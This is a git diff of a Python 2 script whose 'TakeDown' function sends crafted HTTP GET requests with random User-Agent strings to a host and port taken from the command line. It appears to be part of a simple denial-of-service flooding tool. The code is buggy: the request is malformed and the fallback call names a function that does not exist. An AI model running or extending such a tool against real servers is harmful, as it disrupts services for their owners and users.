@@ -19,25 +19,29 @@ def UserAgent():
     
 def TakeDown(host="",port=80):
     try:
-        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    except socket.error,msg:
-        print"Error:",msg
-    else:
         try:
-            host=socket.gethostbyname(host)
-        except socket.gaierror:
-            print"Could not resolve hostname."
-            sys.exit()
+            sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        except socket.error,msg:
+            print "Error:",msg
         else:
-            packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(UsAg)+"\n"+headers).encode('utf-8')
-            if sock.connect_ex((host,port))==0:
-                if sock.sendall(packet)==None:
-                    print"Packet sent successfuly!"
-                    sock.close()
-                else:
-                    print"Error while sending!"
-                    sys.exit()
-
+            try:
+                host=socket.gethostbyname(host)
+            except socket.gaierror:
+                print "Could not resolve hostname."
+                sys.exit()
+            else:
+                packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(UsAg)+"\n"+headers).encode('utf-8')
+                if sock.connect_ex((host,port))==0:
+                    if sock.sendall(packet)==None:
+                        print "Packet sent successfuly!"
+                        sock.close()
+                    else:
+                        print "Error while sending!"
+                        sys.exit()
+    except:
+        print socket.getHostname()
+        
+                        
 if __name__=="__main__":
     host=sys.argv[1] #raw_input("Enter host address:")
     port=sys.argv[2] #raw_input("Enter port number:")
